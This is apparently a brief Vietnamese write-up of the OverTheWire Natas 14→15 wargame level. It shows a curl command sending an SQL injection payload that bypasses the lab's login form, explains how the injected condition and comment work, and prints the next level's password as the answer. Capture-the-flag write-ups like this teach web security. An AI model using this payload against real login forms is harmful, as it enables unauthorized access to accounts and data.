# Natas 14 → 15

## Mục tiêu

Đăng nhập bằng SQL injection.

## Tôi thấy

Form login nối thẳng username vào SQL query.

## Cách làm

```bash
curl -u natas14:<password> -d 'username=" or 1=1 #&password=x' http://natas14.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

`or 1=1` làm điều kiện đúng; `#` comment phần còn lại của query.

## Kết quả

Password của `natas15`:

```text
GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```
